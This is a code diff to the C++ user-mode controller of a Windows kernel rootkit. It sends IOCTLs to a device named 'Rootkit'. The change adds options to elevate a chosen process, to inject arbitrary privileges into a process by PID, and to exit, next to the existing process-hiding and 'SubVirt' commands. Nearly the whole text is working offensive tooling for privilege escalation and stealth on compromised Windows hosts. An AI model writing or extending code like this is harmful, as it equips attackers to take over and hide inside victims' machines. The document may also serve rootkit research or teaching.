@@ -2,6 +2,8 @@
 #include <Windows.h>
 #include <string.h>
 #include "IOCTLs.h"
+#include "utils_client.h"
+#include <vector>
 
 using namespace std;
 
@@ -12,7 +14,12 @@ int main() {
 	int option;
 	char inbuffer[100] = { 0 };
 	char outbuffer[100] = { 0 };
+	string privs;
 	char buf[100] = { 0 };
+	char str = 'y';
+	vector<string> PrivsToAdd;
+	PVARS Priv;
+	ULONG num;
 
 	hDevice = CreateFileW(L"\\\\.\\Rootkit",GENERIC_READ| GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
 
@@ -23,12 +30,15 @@ int main() {
 		 return 1;
 	 }
 
-	 while (1) {
+
+	 while (str == 'y') {
 		 printf("Menu:\n");
 		 cout << "1. Hide Process" << endl;
-		 cout << "2. Elevate Process" << endl;	
-		 cout << "3. Test Connection" << endl;
-		 cout << "4. SubVirt" << endl;
+		 cout << "2. Elevate Process" << endl;
+		 cout << "3. Add Privileges" << endl;
+		 cout << "4. Test Connection" << endl;
+		 cout << "5. SubVirt" << endl;
+		 cout << "6. Exit" << endl;
 
 		 cout << "Enter option: ";
 		 cin >> option;
@@ -49,6 +59,9 @@ int main() {
 			 break;
 
 		 case 2:
+			 cout << "Enter the pid to elevate : "; cin >> buf;
+			 strcpy_s(inbuffer, buf);
+
 			 success = DeviceIoControl(hDevice, ElevateProcess, inbuffer, sizeof(inbuffer), outbuffer, sizeof(outbuffer), &bytesReturned, NULL);
 			 if (success) {
 				 cout << "Process Elevated" << endl;
@@ -59,6 +72,28 @@ int main() {
 			 break;
 
 		 case 3:
+			 cout << "Enter the pid to add privileges : "; cin >> buf;
+			 cout << "Enter the privileges to add seperated by a ',' : "; cin >> privs;
+
+			 num = (ULONG)std::atoi(buf);
+
+			 PrivsToAdd = Utilities::SplitString(privs, ',');
+
+			 for (std::string& value : PrivsToAdd) {
+
+				 Priv = Utilities::CreatePrivStruct(num, value);
+
+				 success = DeviceIoControl(hDevice, AddPrivs, Priv, sizeof(Priv), outbuffer, sizeof(outbuffer), &bytesReturned, NULL);
+				 if (success) {
+					 cout << "Privilege : " << value << "Added!" << endl;
+				 }
+				 else {
+					 cout << "Failed to add privilege : "<< value << endl;
+				 }
+			 }
+			 break;
+
+		 case 4:
 			 cout << "Enter message to send to kernel : "; cin >> buf;
 			 strcpy_s(inbuffer, buf);
 
@@ -72,18 +107,21 @@ int main() {
 			 }
 			 break;
 
-		 case 4:
+		 case 5:
 			 success = DeviceIoControl(hDevice, SubVirt, inbuffer, sizeof(inbuffer), outbuffer, sizeof(outbuffer), &bytesReturned, NULL);
 			 if (success) {
 				 cout << "SubVirt Successful" << endl;
 			 }
 
-
-
 			 else {
 				 cout << "Failed to SubVirt" << endl;
 			 }
 			 break;
+
+		 case 6:
+			 str = 'n';
+			 break;
+
 		 default:
 			 break;
 		 }
